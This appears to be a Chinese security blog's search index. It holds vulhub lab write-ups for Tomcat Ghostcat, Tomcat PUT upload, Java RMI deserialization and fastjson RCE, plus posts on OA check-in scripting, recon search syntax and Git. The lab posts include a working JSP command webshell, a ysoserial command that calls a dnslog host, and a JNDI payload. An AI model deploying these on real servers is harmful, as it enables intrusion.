<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Aapache Tomcat AJP 文件包含漏洞（CVE-2020-1938）</title>
      <link href="/2020/07/19/Aapache-Tomcat-AJP%EF%BC%88CVE-2020-1938%EF%BC%89/"/>
      <url>/2020/07/19/Aapache-Tomcat-AJP%EF%BC%88CVE-2020-1938%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Aapache-Tomcat-AJP-文件包含漏洞（CVE-2020-1938）"><a href="#Aapache-Tomcat-AJP-文件包含漏洞（CVE-2020-1938）" class="headerlink" title="Aapache Tomcat AJP 文件包含漏洞（CVE-2020-1938）"></a>Aapache Tomcat AJP 文件包含漏洞（CVE-2020-1938）</h1><p>Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。</p><p><a href="https://www.chaitin.cn/zh/ghostcat" target="_blank" rel="noopener">Ghostcat（幽灵猫）</a> 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个Tomcat 9.0.30：</p><pre><code>docker-compose up -d</code></pre><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看tomcat默认页面，此时通过AJP协议的8009端口亦可访问Tomcat。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用如下工具均可测试漏洞：</p><ul><li><a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">https://github.com/chaitin/xray</a></li><li><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></li></ul><p><code>\Desktop\CNVD-2020-10487-Tomcat-Ajp-lfi-master&gt;python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.10.128 -p 8009 -f WEB-INF/web.xml</code></p><p><img src="https://s1.ax1x.com/2020/07/19/UWSD2Q.png" alt="UWSD2Q.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</title>
      <link href="/2020/07/15/Tomcat-PUT%EF%BC%88CVE-2017-12615%EF%BC%89/"/>
      <url>/2020/07/15/Tomcat-PUT%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><p>Tomcat版本：8.5.19</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre><code>docker-compose builddocker-compose up -d</code></pre><p>运行完成后访问<code>http://your-ip:8080</code>即可看到Tomcat的Example页面。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>jsp有回显带密码验证的一句话木马</p><p><img src="https://s1.ax1x.com/2020/07/15/U0u4ld.png" alt="U0u4ld.png"></p><pre><code>&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a=in.read(b))!=-1){out.println(new String(b));}out.print(&quot;&lt;/pre&gt;&quot;);}%&gt;请求：http://192.168.16.240:8080/Shell/cmd2.jsp?pwd=023&amp;i=ls</code></pre><p><img src="https://s1.ax1x.com/2020/07/15/U0u70P.png" alt="U0u70P.png"></p><p>完。</p><p>参考文章：<a href="https://www.debugger.wiki/article/html/1570928400169147" target="_blank" rel="noopener">https://www.debugger.wiki/article/html/1570928400169147</a></p><p><a href="https://cloud.tencent.com/developer/article/1468772" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1468772</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10264236.html" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/10264236.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java RMI Registry 反序列化漏洞</title>
      <link href="/2020/07/15/Java-RMI-Registry/"/>
      <url>/2020/07/15/Java-RMI-Registry/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-RMI-Registry-反序列化漏洞-lt-jdk8u111"><a href="#Java-RMI-Registry-反序列化漏洞-lt-jdk8u111" class="headerlink" title="Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)"></a>Java RMI Registry 反序列化漏洞(&lt;=jdk8u111)</h1><p>Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1).</p><h2 id="搭建Java-RMI-Registry环境，RMIIP为虚拟机IP。"><a href="#搭建Java-RMI-Registry环境，RMIIP为虚拟机IP。" class="headerlink" title="搭建Java RMI Registry环境，RMIIP为虚拟机IP。"></a>搭建Java RMI Registry环境，RMIIP为虚拟机IP。</h2><pre><code>cd /root/vulhub/java/rmi-registry-bind-deserialization/docker-compose build# 启动环境docker-compose run -e RMIIP=192.168.1.160 -p 1099:1099 rmi</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code># 在ysoserial目录下执行java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.160.128 1099 CommonsCollections6 &quot;curl http://hq7rcl.dnslog.cn&quot;</code></pre><p>在线查询连接请求。在线工具：<a href="http://dnslog.cn/" target="_blank" rel="noopener">http://dnslog.cn/</a></p><p><img src="https://s1.ax1x.com/2020/07/15/U0nWMn.png" alt="U0nWMn.png"></p><p>连接结果</p><p><img src="https://s1.ax1x.com/2020/07/15/U0nhq0.png" alt="U0nhq0.png"></p><p>执行创建文件的命令</p><p><img src="https://s1.ax1x.com/2020/07/15/U0nXs1.png" alt="U0nXs1.png"></p><p>查看docker中创建的文件。</p><p><img src="https://s1.ax1x.com/2020/07/15/U0njqx.png" alt="U0njqx.png"></p><p>漏洞复现成功。</p><p>参考资料：<a href="https://github.com/vulhub/vulhub/tree/master/java/rmi-registry-bind-deserialization" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/java/rmi-registry-bind-deserialization</a></p><p>​                  <a href="https://blog.csdn.net/JiangBuLiu/article/details/95492587" target="_blank" rel="noopener">https://blog.csdn.net/JiangBuLiu/article/details/95492587</a></p><p>​                  <a href="https://vulhub.org/#/environments/jmeter/CVE-2018-1297/" target="_blank" rel="noopener">https://vulhub.org/#/environments/jmeter/CVE-2018-1297/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson 1.2.24 反序列化导致任意命令执行漏洞</title>
      <link href="/2020/07/14/fastjson1-2-24/"/>
      <url>/2020/07/14/fastjson1-2-24/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞</h1><p>ubuntu安装curl。<br>apt install curl</p><h2 id="docker环境部署"><a href="#docker环境部署" class="headerlink" title="docker环境部署"></a>docker环境部署</h2><p>下载安装docker<br>curl -fsSL <a href="https://get.docker.com" target="_blank" rel="noopener">https://get.docker.com</a> | bash -s docker –mirror Aliyun</p><p>将普通用户添加到docker用户组<br>sudo usermod -aG docker duyada<br>cat /etc/group |grep docker</p><h2 id="vulhub靶机搭建"><a href="#vulhub靶机搭建" class="headerlink" title="vulhub靶机搭建"></a>vulhub靶机搭建</h2><p>安装compose<br>apt install docker-compose</p><p>下载vulhub项目<br>wget <a href="https://github.com/vulhub/vulhub/archive/master.zip" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/archive/master.zip</a> -O vulhub-master.zip</p><p>解压缩<br>unzip vulhub-master.zip</p><h3 id="靶机的使用"><a href="#靶机的使用" class="headerlink" title="靶机的使用"></a>靶机的使用</h3><p>选择某一个漏洞环境的目录<br>cd vulhub-master<br>cd fastjson/<br>ls<br>cd 1.2.24-rce/<br>ls</p><p>自动化编译环境<br>docker-compose build</p><p>启动整个环境<br>docker-compose up -d</p><hr><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>环境运行后，访问<a href="http://192.168.1.128:8090" target="_blank" rel="noopener">http://192.168.1.128:8090</a></p><p><img src="https://s1.ax1x.com/2020/07/14/UU6nIg.png" alt="UU6nIg.png"></p><p>我们向这个地址POST一个JSON对象，即可更新服务端的信息。确认是使用json解析的。</p><pre><code>curl http://192.168.1.128:8090/ -H &quot;Content-Type: application/json&quot; --data &#39;{&quot;name&quot;:&quot;hello&quot;, &quot;age&quot;:20}&#39;</code></pre><p><img src="https://s1.ax1x.com/2020/07/14/UU6NoF.png" alt="UU6NoF.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p></blockquote><p>首先编译命令执行代码TouchFile.java。<code>D:\tf&gt; javac .\TouchFile.java</code>编译生成<code>TouchFile.class</code>文件。</p><pre><code>// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {&quot;touch&quot;, &quot;/tmp/success&quot;};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><p>然后我们借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，下载marshalsec工具，用来开启RMI&amp;LDAP，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p><p><a href="https://github.com/MagicZer0/fastjson-rce-exploit/blob/master/marshalsec-0.0.3-SNAPSHOT-all.jar" target="_blank" rel="noopener">https://github.com/MagicZer0/fastjson-rce-exploit/blob/master/marshalsec-0.0.3-SNAPSHOT-all.jar</a></p><p>在文件路径cmd中运行以下命令：</p><pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.1.1:8000/#TouchFile&quot; 9999</code></pre><blockquote><p>错误: 找不到或无法加载主类 marshalsec.jndi.RMIRefServer</p><p>原因：包名和marshalsec-0.0.3-SNAPSHOT-all.jar不在同一路径中</p><p>参考文章：<a href="https://zhidao.baidu.com/question/1690731339477414628.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/1690731339477414628.html</a></p></blockquote><p>用marshalsec开启RMI服务</p><p><img src="https://s1.ax1x.com/2020/07/14/UUcHj1.png" alt="UUcHj1.png"></p><p>使用python3搭建http服务，注意路径。</p><pre><code>python3 -m http.server 80</code></pre><p><img src="https://s1.ax1x.com/2020/07/14/UUgVUS.png" alt="UUgVUS.png"></p><p>使用bp软件抓包，修改请求内容。向靶场服务器发送Payload，带上RMI的地址：</p><pre><code>POST / HTTP/1.1                           #GET请求改为POSTHost: 192.168.1.128:8090Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeContent-Type: application/jsonContent-Length: 156{   &quot;b&quot;:{       &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,       &quot;dataSourceName&quot;:&quot;rmi://192.168.1.1:9999/TouchFile&quot;,       &quot;autoCommit&quot;:true   }}</code></pre><p>向靶机发送请求。</p><p><img src="https://s1.ax1x.com/2020/07/14/UUgn3j.png" alt="UUgn3j.png"></p><p>发送payload攻击包，rmi收到请求</p><p><img src="https://s1.ax1x.com/2020/07/14/UUgQuq.png" alt="UUgQuq.png"></p><p>http服务接收到请求，返回404，连接失败</p><p><img src="https://s1.ax1x.com/2020/07/14/UUg1bV.png" alt="UUg1bV.png"></p><p>切换路径到d:\tf再次发送payload。返回200，连接成功</p><p><img src="https://s1.ax1x.com/2020/07/14/UUg8ET.png" alt="UUg8ET.png"></p><p>去docker容器中查看命令已经成功执行。命令<code>touch /tmp/success</code>执行成功。</p><p><img src="https://s1.ax1x.com/2020/07/14/UUgJ5F.png" alt="UUgJ5F.png"></p><p>完。</p><p>测试完成后，删除整个环境<br>docker-compose down -v</p><p>参考资料：<a href="https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce</a></p><p>​                  <a href="https://www.yuque.com/m1tang/gqsay7/szhpyy" target="_blank" rel="noopener">https://www.yuque.com/m1tang/gqsay7/szhpyy</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现自动化签到</title>
      <link href="/2020/07/09/python-1/"/>
      <url>/2020/07/09/python-1/</url>
      
        <content type="html"><![CDATA[<h2 id="实现自动化签到"><a href="#实现自动化签到" class="headerlink" title="实现自动化签到"></a>实现自动化签到</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在OA上签到打卡和签退，但是总有些时候会忘记打卡，每天签到签退又很麻烦，于是就想到通过脚本实现自动化签到签退。</p><h3 id="获取请求包信息"><a href="#获取请求包信息" class="headerlink" title="获取请求包信息"></a>获取请求包信息</h3><p>首先打开网页打开F12，点击<code>Network</code>，点击<code>签到</code>。会出现一些请求文件，打开并查看<code>Headers</code>，查看<code>preview</code>显示得是返回的信息。</p><p>请求包内容，<code>request headers</code></p><pre><code>&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,&#39;Referer&#39;: &#39;从哪个网页跳转过来的&#39;,&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&#39;,&#39;Cookie&#39;: &#39;&#39;</code></pre><p>查看是<code>GET</code>请求还是<code>POST</code>请求。</p><h3 id="签到脚本"><a href="#签到脚本" class="headerlink" title="签到脚本"></a>签到脚本</h3><pre><code class="python">import requestsimport timeurl = &#39;http://xxx/hrm/schedule/HrmScheduleSignXMLHTTP.jsp?t=0.2655744879360351&#39;headers = {    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,    &#39;Referer&#39;: &#39;http://xxx/wui/main.jsp&#39;,    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&#39;,    &#39;Cookie&#39;: &#39;xxx&#39;}response = requests.post(url=url,headers=headers)print(response.text)</code></pre><p>签到返回内容</p><p><img src="https://s1.ax1x.com/2020/07/09/UeBhdA.png" alt="UeBhdA.png"></p><p>签到成功。</p><p>添加日志功能，只记录了运行时间。这个脚本还不够完美。</p><pre><code class="python">import requestsimport timeimport reurl = &#39;http://xxx/hrm/schedule/HrmScheduleSignXMLHTTP.jsp?t=0.2655744879360351&#39;headers = {    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,    &#39;Referer&#39;: &#39;http://xxx/wui/main.jsp&#39;,    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&#39;,    &#39;Cookie&#39;: &#39;&#39;}response = requests.post(url=url,headers=headers)now = time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;,time.localtime())msg = response.texttime = re.findall(r&#39;&lt;tr&gt;(.+?)&lt;/tr&gt;&#39;,msg)print(time)try:    with open(&#39;/home/admin/oa/log/log.txt&#39;,&#39;a&#39;) as f:        f.write(&#39;{} --- {}\n&#39;.format(now,time))        f.close()        print(response.text)except Exception as e:    print(e)</code></pre><p>运行成功后，测试。</p><h3 id="设置定时任务"><a href="#设置定时任务" class="headerlink" title="设置定时任务"></a>设置定时任务</h3><p>编辑<code>/etc/crontab</code>文件。</p><blockquote><p>30 8    * * 1-5 root    sh /home/admin/oa/oa.sh</p><p>每周一到周五的8点半运行这个脚本。</p></blockquote><p>查看记录的日志文件。</p><p><img src="https://s1.ax1x.com/2020/07/09/UeHhjg.png" alt="UeHhjg.png"></p><p>自动签到部分大功告成。</p><hr><h3 id="自动签退"><a href="#自动签退" class="headerlink" title="自动签退"></a>自动签退</h3><p>点击签退，抓包，获得签退时的请求链接。</p><p><img src="https://s1.ax1x.com/2020/07/09/Un8UQs.png" alt="Un8UQs.png"></p><p>修改脚本请求的链接即可完成签退脚本。</p><pre><code class="python">import requestsimport timeimport reurl = &#39;http://xxx/hrm/schedule/HrmScheduleSignXMLHTTP.jsp?t=0.961868599700483&#39;headers = {    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,    &#39;Referer&#39;: &#39;http://xxx/wui/main.jsp&#39;,    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&#39;,    &#39;Cookie&#39;: &#39;xxx&#39;}response = requests.post(url=url,headers=headers)now = time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;,time.localtime())msg = response.texttime = re.findall(r&#39;&lt;tr&gt;(.+?)&lt;/tr&gt;&#39;,msg)print(time)try:    with open(&#39;/home/admin/oa/log/log.txt&#39;,&#39;a&#39;) as f:        f.write(&#39;{} ---quit success {}\n&#39;.format(now,time))        f.close()        print(response.text)except Exception as e:    print(e)</code></pre><p>查看运行后的日志记录</p><p><img src="https://s1.ax1x.com/2020/07/09/UnGF6s.png" alt="UnGF6s.png"></p><p>测试完成。添加到定时任务中。</p><p>完。</p>]]></content>
      
      
      
        <tags>
            
            <tag> bash </tag>
            
            <tag> python </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web基本概念</title>
      <link href="/2020/07/07/web-1/"/>
      <url>/2020/07/07/web-1/</url>
      
        <content type="html"><![CDATA[<h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>一、域名简介</p><p>为了便于我们访问服务器，就有了域名的诞生。域名和IP地址的关系就相当于姓名和身份证号之间的关系。域名是为了方便记忆。</p><p> 二、域名查询</p><p>1、根据域名我们可以查询一些服务器的信息，比如ip地址，管理员的部分信息。</p><p>2、推荐网址：<a href="http://tool.chinaz.com" target="_blank" rel="noopener">http://tool.chinaz.com</a></p><p><a href="https://www.aizhan.com" target="_blank" rel="noopener">https://www.aizhan.com</a></p><p> 三、子域名收集</p><p>.com 顶级域名</p><p>baidu.com 二级域名</p><p>m.baidu.com 三级域名</p><p>一个服务器上可以搭建多个网站，所有就有许多域名对应一个IP地址，想找这个服务器上的漏洞，可以从多个网站入手，这就是子域名收集的重要性。</p><h3 id="CMS识别"><a href="#CMS识别" class="headerlink" title="CMS识别"></a>CMS识别</h3><p>打开一个网站，我们可以先看一下该网站的CMS，</p><p>推荐使用在线识别工具：</p><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a></p><p><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></p><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>一个服务器可以对应多个域名，同样也可以对应多个端口，比如：192.168.1.111:80 192.168.1.111:82，不同端口可以搭建不同网站。</p><hr><p>常见端口：</p><p>HTTP协议代理服务器：80/8080/3128/8081/9080</p><p>FTP文件传输协议:21</p><p>Telnet远程登录协议:23</p><p>TFTP协议:69/udp</p><p>SMTP(E-mail): 25/tcp</p><p>POP3:110/tcp</p><p>TOMCAT:8080</p><p>win2003远程登录:3389</p><p>Oracle数据库:1521</p><p>MS SQL SERVER:1433/tcp/udp</p><p>QQ: 1080/udp</p><p>SSH安全登录、SCP文件传输、端口重定向：22/tcp</p><hr><p>查看服务器开放工具：masscan，nmap</p><h3 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h3><p>一、Google搜索</p><p>site:baidu.com  可以查看子域名</p><p>inurl:.php?id= 搜索我们指定的字符是否存在于URL中</p><p>intext:管理 将返回所有在网页正文部分包含关键词的网页</p><p>intitle: 管理 将返回所有网页标题中包含关键词的网页</p><p>filetype:txt 搜索指定的文件类型</p><p>“精准查找” 引号里面的内容是精准查找的</p><p>aiyou -bucuo 搜索有aiyou，但是排除带bucuo的内容</p><p>link:baidu.com 可以返回所有和baidu.com做了链接的URL。</p><p>二、fofa搜索</p><p>title=”abc” 从标题中搜索abc</p><p>header=”abc” 从http头中搜索abc</p><p>body=”abc” 从html正文中搜索abc</p><p>domain=”qq.com” 搜索根域名带有qq.com的网站</p><p>host=”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称</p><p>port=”443” 查找对应443端口</p><p>ip=”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称</p><p>protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)</p><p>city=”Beijing” 搜索指定城市</p><p>region=”Zhejiang” 搜索指定行政区</p><p>country=”CN” 搜索指定国家(编码)</p><p>三、钟馗之眼</p><p>app:nginx 组件名</p><p>ver:1.0 版本</p><p>os:windows 操作系统</p><p>country:”China” 国家</p><p>city:”hangzhou” 城市</p><p>port:80 端口</p><p>vhostname:google 主机名</p><p>`site:thief.onev 网站域名</p><p>desc:nmask 描述</p><p>keywords:nmask’blog 关键词</p><p>service:ftpv 服务类型</p><p>ip:8.8.8.8 ip地址</p><p>cidr:8.8.8.8/24 ip地址段</p><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>CDN：当一个服务器被不同地方的客户端大量访问的时候，服务器可能会出现压力，为了减小这些压力，就有CDN的出现。还有一个作用就是隐藏真实IP。</p><p>一、判断CDN是否存在</p><p>我们可以随便ping一下网址，得到一个IP地址，然后把这个IP直接放到浏览器，看是否能正常该网站，如果能说明没有CDN防护。</p><p>二、绕过CDN</p><p>1、通过站长工具的多地ping</p><p>2、通过ping子域名，一般网站只在主站挂CDN</p><p>在线查询：</p><p><a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a></p><p><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a></p><p><a href="http://ping.chinaz.com" target="_blank" rel="noopener">http://ping.chinaz.com</a> </p><h3 id="mysql语法"><a href="#mysql语法" class="headerlink" title="mysql语法"></a>mysql语法</h3><p>一、基本语法</p><p>show databases(); 显示当前数据库</p><p>show user()；显示当前用户</p><p>show now()；显示当前时间</p><p>use 数据库名称；选择数据库</p><p>show tables；显示选择的数据的所有表</p><p>show create table users \G;显示表结构的详细数据</p><p>DESCribe 表名；显示表结构，大写可以自动补全</p><p>select * from users；查询所有数据</p><p>select id,name from users; 查询两列表</p><p>select * from users where id=‘2’； 如果不加引号表示字段名称，加上引号表示字段内容</p><p>limit 3 限制显示3行</p><p>select DISTINCT 表名 去重复的名字</p><p>select database() 显示当前数据库</p><p>select version 显示数据库版本</p><p>select user() 显示当前用户</p><p>二、增删改查</p><p>select 列名称 from 表名称 where 字段1=’条件1’ and 字段2=’条件2’</p><p>insert into 表名(列1，列2.。。)values（值1，值2）</p><p>update 表名称 set 列名称=新值 where 列名称=某值</p><p>delete from 表名称 where 列名称=值</p><p>三、注释</p><p>–空格</p><p>#</p><p>/**/</p><p>四、mysql5.0以上版本的特性：</p><p>默认定义information_schema数据库，里面具有表schemata(数据库名)、tables(表名)、columns(列名或字段名)</p><p>在schemata表中，schema_name字段用来存储数据库名</p><p>在tables表中，table_schema和table_name分别用来存储数据库名。</p><p>在columns表中，tabel_schema存储数据库名，table_name存储表名，column_name存储字段名</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>考前须知</title>
      <link href="/2020/06/29/%E8%80%83%E5%89%8D%E9%A1%BB%E7%9F%A5/"/>
      <url>/2020/06/29/%E8%80%83%E5%89%8D%E9%A1%BB%E7%9F%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="考前须知"><a href="#考前须知" class="headerlink" title="考前须知"></a>考前须知</h3><p><code>**********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************</code></p><ul><li>河南人事网报名网站：<a href="http://www.hnrsks.com/LinkPage/News_list.aspx?dict_id=d_sgwyzt&amp;dict_values=A&amp;_d_id=1b335f82e8f8f17e4209556eec8515" target="_blank" rel="noopener">http://www.hnrsks.com/LinkPage/News_list.aspx?dict_id=d_sgwyzt&amp;dict_values=A&amp;_d_id=1b335f82e8f8f17e4209556eec8515</a></li></ul><p>其中，提交报名申请及初审环节，通过河南人事考试网进行。报名确认、打印准考证两个环节，报考省直机关（单位）的，通过河南人事考试网进行；报考省辖市及以下职位的，通过相关省辖市的考试录用公务员工作专用网站进行。</p><ul><li>报名确认缴费地址：鹤壁人事考试网<a href="http://www.hbsrsks.com/st/default.html" target="_blank" rel="noopener">http://www.hbsrsks.com/st/default.html</a></li></ul><p>这是为了改变当前的现状所做的选择，这是一次改变人生轨迹的机会。</p>]]></content>
      
      
      
        <tags>
            
            <tag> private </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git记录</title>
      <link href="/2020/06/14/Git/"/>
      <url>/2020/06/14/Git/</url>
      
        <content type="html"><![CDATA[<p>学习了一点Git基础用法，记录一下。</p><h2 id="Git记录"><a href="#Git记录" class="headerlink" title="Git记录"></a>Git记录</h2><p>Git是分布式版本控制系统。是用C语言开发的，没有中央服务器，任何一台电脑都能充当中央服务器。</p><p>Git可以管理文件的修改版本。</p><p>Git安装后配置</p><pre><code class="bash">$ git config --global user.name &quot;Your Name&quot;$ git config --global user.email &quot;email@example.com&quot;</code></pre><p>创建版本库，在合适的地方创建一个空目录。</p><p><code>Git init</code>初始化这个目录，把这个目录变成Git可管理的仓库。初始化完成后，会出现一个<code>.git</code>的文件夹。这个文件夹默认隐藏。</p><blockquote><p>所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。</p><p>不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。</p><p>使用Windows的童鞋要特别注意：</p><p>千万不要使用Windows自带的<strong>记事本</strong>编辑任何文本文件。原因是Microsoft开发记事本的团队使用了一个非常弱智的行为来保存UTF-8编码的文件，他们自作聪明地在每个文件开头添加了0xefbbbf（十六进制）的字符，你会遇到很多不可思议的问题，比如，网页第一行可能会显示一个“?”，明明正确的程序一编译就报语法错误，等等，都是由记事本的弱智行为带来的。建议你下载<a href="http://notepad-plus-plus.org/" target="_blank" rel="noopener">Notepad++</a>代替记事本，不但功能强大，而且免费！记得把Notepad++的默认编码设置为UTF-8 without BOM即可</p></blockquote><p>创建一个文件在Git可管理的目录中。</p><pre><code>$ git add readme.txt$ git commit -m &quot;wrote a readme file&quot;//简单解释一下git commit命令，-m后面输入的是本次提交的说明，可以输入任意内容，当然最好是有意义的，这样你就能从历史记录里方便地找到改动记录。</code></pre><p>查看文件做了哪些修改<code>git diff</code>。我们用<code>git status</code>命令看看仓库的当前状态。</p><h3 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h3><p>在Git中，我们用<code>git log</code>命令查看历史记录。如果嫌输出信息太多，看得眼花缭乱的，可以试试加上<code>--pretty=oneline</code>参数。</p><blockquote><p>需要友情提示的是，你看到的一大串类似<code>1094adb...</code>的是<code>commit id</code>（版本号），和SVN不一样，Git的<code>commit id</code>不是1，2，3……递增的数字，而是一个SHA1计算出来的一个非常大的数字，用十六进制表示，而且你看到的<code>commit id</code>和我的肯定不一样，以你自己的为准。为什么<code>commit 